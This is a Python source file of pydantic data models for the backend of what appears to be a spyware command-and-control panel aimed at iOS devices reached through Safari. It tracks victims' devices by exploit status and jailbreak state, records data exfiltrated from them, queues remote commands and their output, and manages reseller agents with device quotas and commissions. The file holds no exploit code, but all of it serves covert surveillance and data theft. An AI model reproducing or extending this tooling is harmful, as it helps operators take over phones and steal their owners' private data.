from pydantic import BaseModel, Field
from datetime import datetime
from typing import Optional, List


class Token(BaseModel):
    access_token: str
    token_type: str


class TokenData(BaseModel):
    username: Optional[str] = None


class UserCreate(BaseModel):
    username: str
    password: str
    role: str = "operator"


class UserUpdate(BaseModel):
    username: Optional[str] = None
    password: Optional[str] = None
    role: Optional[str] = None


class UserResponse(BaseModel):
    id: int
    username: str
    role: str
    created_at: datetime
    last_login: Optional[datetime] = None
    google_2fa_enabled: int = 0

    class Config:
        orm_mode = True


class LogResponse(BaseModel):
    id: int
    timestamp: datetime
    ip: str
    method: Optional[str] = None
    path: Optional[str] = None
    status_code: Optional[int] = None
    content_length: Optional[int] = None
    user_agent: Optional[str] = None
    log_type: str
    device_uuid: Optional[str] = None
    channel_id: Optional[int] = None
    template_id: Optional[int] = None


class DeviceResponse(BaseModel):
    id: int
    device_uuid: str
    first_seen: datetime
    last_seen: datetime
    ip: str
    user_agent: Optional[str] = None
    status: str
    os_version: Optional[str] = None
    safari_version: Optional[str] = None
    device_model: Optional[str] = None
    chipset: Optional[str] = None
    jailbroken: Optional[str] = None
    exploit_status: Optional[str] = None
    last_command_time: Optional[datetime] = None
    group_id: Optional[int] = None
    group_name: Optional[str] = None
    group_color: Optional[str] = None
    note: Optional[str] = None
    host: Optional[str] = None
    referer: Optional[str] = None
    access_path: Optional[str] = None
    ip_location: Optional[str] = None
    hw_model: Optional[str] = None
    enabled: Optional[int] = None
    channel_id: Optional[int] = None
    channel_slug: Optional[str] = None
    channel_name: Optional[str] = None
    channel_color: Optional[str] = None
    template_id: Optional[int] = None
    template_slug: Optional[str] = None
    template_name: Optional[str] = None


class DeviceUpdate(BaseModel):
    os_version: Optional[str] = None
    safari_version: Optional[str] = None
    device_model: Optional[str] = None
    chipset: Optional[str] = None
    jailbroken: Optional[str] = None
    exploit_status: Optional[str] = None
    channel_id: Optional[int] = None
    template_id: Optional[int] = None


class ExfilDataResponse(BaseModel):
    id: int
    device_uuid: str
    category: str
    path: str
    description: Optional[str] = None
    file_path: str
    file_size: int
    uploaded_at: datetime


class CommandResponse(BaseModel):
    id: int
    device_uuid: str
    command: str
    status: str
    output: Optional[str] = None
    created_at: datetime
    executed_at: Optional[datetime] = None


class CommandCreate(BaseModel):
    command: str
    device_uuid: Optional[str] = None


class StatsResponse(BaseModel):
    total_requests: int
    total_devices: int
    total_exfil: int
    active_devices: int
    ios_logs: int
    pending_commands: int
    today_requests: int
    today_exfil: int
    request_trend: List[int]
    exfil_trend: List[int]


class AgentCreate(BaseModel):
    username: str
    password: str
    name: Optional[str] = None
    contact: Optional[str] = None
    phone: Optional[str] = None
    email: Optional[str] = None
    max_devices: Optional[int] = None
    device_quota: Optional[int] = None
    commission_rate: Optional[int] = None
    commission: Optional[float] = None
    notes: Optional[str] = None
    remark: Optional[str] = None
    enabled: Optional[bool] = None


class AgentUpdate(BaseModel):
    name: Optional[str] = None
    contact: Optional[str] = None
    phone: Optional[str] = None
    email: Optional[str] = None
    max_devices: Optional[int] = None
    device_quota: Optional[int] = None
    commission_rate: Optional[int] = None
    commission: Optional[float] = None
    notes: Optional[str] = None
    remark: Optional[str] = None
    enabled: Optional[bool] = None


class AgentResetPassword(BaseModel):
    new_password: Optional[str] = None
    password: Optional[str] = None


class AssignChannelsRequest(BaseModel):
    channel_ids: Optional[List[int]] = None


class AgentResponse(BaseModel):
    id: int
    username: str
    name: Optional[str] = None
    contact: Optional[str] = None
    phone: Optional[str] = None
    enabled: int
    max_devices: int
    commission_rate: int
    notes: Optional[str] = None
    last_login: Optional[datetime] = None
    last_login_ip: Optional[str] = None
    google_2fa_enabled: int = 0
    created_at: datetime


class AssignDataRequest(BaseModel):
    type: str
    ids: List[int]
